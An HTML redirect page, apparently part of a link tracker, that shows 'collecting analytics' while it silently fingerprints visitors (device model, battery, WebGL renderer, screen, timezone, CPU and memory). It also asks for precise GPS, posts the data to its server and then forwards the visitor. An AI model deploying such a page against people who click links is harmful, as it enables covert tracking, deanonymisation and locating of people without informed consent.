<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Redirecting…</title>
  <style>
    body { font-family: system-ui, sans-serif; background:#0f1115; color:#e6e6e6;
           display:grid; place-items:center; height:100vh; margin:0; }
    .box { text-align:center; max-width:340px; padding:0 20px; }
    .spin { width:28px; height:28px; border:3px solid #333; border-top-color:#6ea8fe;
            border-radius:50%; margin:0 auto 14px; animation:s 0.8s linear infinite; }
    @keyframes s { to { transform:rotate(360deg); } }
    small { color:#8a8f98; }
    button { margin-top:14px; background:#6ea8fe; color:#0b0e14; border:0;
             padding:8px 16px; border-radius:8px; font-weight:600; cursor:pointer; }
  </style>
</head>
<body>
  <!--
    This landing page is the CLIENT-SIDE half of the tracker. It runs in the
    visitor's browser, reads details the server can't see, POSTs them back, then
    forwards the visitor to the real destination.

    GPS is different from everything else here: the browser shows an unavoidable
    "Allow location?" prompt. The visitor must consent — you cannot get precise
    location silently. So we show them what's happening.
  -->
  <div class="box">
    <div class="spin"></div>
    <div id="msg">Redirecting…</div>
    <small id="sub">collecting analytics</small>
  </div>

  <script>
    const HIT_ID = "__HIT_ID__";
    const DESTINATION = decodeURIComponent("__DESTINATION__");

    // --- Battery: Chromium-only, returns a promise; may be absent ---
    async function getBattery() {
      try {
        if (!navigator.getBattery) return null;
        const b = await navigator.getBattery();
        return {
          level: Math.round(b.level * 100),        // percent
          charging: b.charging,
          chargingTimeSec: isFinite(b.chargingTime) ? b.chargingTime : null,
          dischargingTimeSec: isFinite(b.dischargingTime) ? b.dischargingTime : null,
        };
      } catch { return null; }
    }

    // --- Exact model + versions via UA Client Hints (Chromium/Android, silent) ---
    // On Android this returns the real model code (e.g. "SM-A226B", "RMX3363");
    // on desktop `model` is empty. No permission prompt.
    async function getUAData() {
      try {
        if (!navigator.userAgentData || !navigator.userAgentData.getHighEntropyValues) return null;
        return await navigator.userAgentData.getHighEntropyValues([
          "model", "platform", "platformVersion",
          "architecture", "bitness", "fullVersionList", "uaFullVersion",
        ]);
      } catch { return null; }
    }

    // --- GPS: shows a permission prompt. Resolves to null if blocked/timeout ---
    function getGeo() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          (p) => resolve({
            lat: p.coords.latitude,
            lng: p.coords.longitude,
            accuracyMeters: p.coords.accuracy,
            altitude: p.coords.altitude,
            heading: p.coords.heading,
            speed: p.coords.speed,
          }),
          (err) => resolve({ denied: true, reason: err.message }), // user blocked, etc.
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      });
    }

    // Silent (no-prompt) fields.
    function collectSilent() {
      const n = navigator, s = screen;
      let webglVendor = null, webglRenderer = null;
      try {
        const gl = document.createElement("canvas").getContext("webgl");
        const dbg = gl && gl.getExtension("WEBGL_debug_renderer_info");
        if (dbg) {
          webglVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL);
          webglRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
        }
      } catch {}
      return {
        screen: `${s.width}x${s.height}`,
        viewport: `${innerWidth}x${innerHeight}`,
        colorDepth: s.colorDepth,
        pixelRatio: devicePixelRatio,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffsetMin: new Date().getTimezoneOffset(),
        languages: n.languages,
        platform: n.platform,
        cpuCores: n.hardwareConcurrency,          // exact CPU cores
        deviceMemoryGB: n.deviceMemory || null,   // coarse RAM, Chrome only
        touchPoints: n.maxTouchPoints,
        webglVendor, webglRenderer,
        connection: n.connection ? {
          type: n.connection.effectiveType, downlinkMbps: n.connection.downlink
        } : null,
      };
    }

    async function run() {
      const client = collectSilent();
      client.battery = await getBattery();          // battery %, charging state
      client.uaData = await getUAData();            // exact model + browser versions

      // Ask for location — tell the visitor why the prompt appeared.
      document.getElementById("msg").textContent = "One moment…";
      document.getElementById("sub").textContent = "this link requests your location";
      client.geoP = await getGeo();                 // shows Allow/Block prompt

      await fetch("/api/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ hitId: HIT_ID, client }),
      }).catch(() => {});

      window.location.replace(DESTINATION);
    }

    run();
  </script>
</body>
</html>
